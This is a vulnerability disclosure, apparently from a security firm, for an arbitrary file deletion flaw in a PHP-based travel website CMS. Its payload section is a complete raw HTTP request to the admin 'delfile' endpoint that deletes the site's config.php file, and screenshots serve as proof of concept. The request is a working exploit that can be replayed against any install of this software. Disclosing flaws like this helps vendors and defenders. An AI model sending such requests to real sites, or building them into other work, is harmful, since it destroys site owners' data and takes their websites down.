# PHP-based travel website-CMS delfile filename Arbitrary file deleteing

**Exploit Title: PHP-based travel website-CMS delfile-filename exists in Arbitrary file deleteing vulnerability**

**Exploit Author: webraybtl@webray.com.cn inc**

**Vendor Homepage: https://github.com/baowzh/hfly**

**Software Link: https://github.com/baowzh/hfly**

**CMSName: PHP-based travel website-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

Due to the lack of strict directory restrictions or permission verification on file path parameters passed in by users on the server, attackers can perform file operations across directories or even drive letters by constructing special paths (such as directory traversal symbols../). For example, attackers can modify request parameters to read or delete sensitive system files, such as delfile? filename=%2Fconfig%2Fconfig.php， Core database files can be deleted, causing website crashes

Payload used:

```
GET /admin/index.php/datafile/delfile?filename=%2Fconfig%2Fconfig.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Cookie: ADMIN_PHPSESSID=sj5k234u5eue0uof0k099k35j7; current_city=nanning; WEB_PHPSESSID=1sctd026e5pvjv02v6ksbbtrj2; Hm_lvt_8987594b0b7682191cafc4396e168113=1764236266; HMACCOUNT=36908916AD850A67; __51cke__=; Hm_lpvt_8987594b0b7682191cafc4396e168113=1764236600; __tins__17819771=%7B%22sid%22%3A%201764236266063%2C%20%22vd%22%3A%2018%2C%20%22expires%22%3A%201764238400368%7D; __51laig__=18
Host: 172.24.6.217:88
Referer: http://172.24.6.217:88/admin/index.php/datafile/lists
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36537.36## 
```

## Proof of Concept

<img width="1590" height="1396" alt="2025-11-27-17-53-45-image" src="https://github.com/user-attachments/assets/f8fe3e9a-3054-4732-a584-84997f949cb6" />


<img width="2320" height="1155" alt="2025-11-27-17-54-25-image" src="https://github.com/user-attachments/assets/f8c3dab3-2216-4a3a-9366-9d03c7b5544f" />


<img width="810" height="645" alt="2025-11-27-17-55-27-image" src="https://github.com/user-attachments/assets/187d48fa-28e6-44c7-a5b6-8914b65f220f" />

<img width="801" height="296" alt="2025-11-27-17-54-50-image" src="https://github.com/user-attachments/assets/133bdeb7-5c92-4966-8a41-e9d395b245d1" />

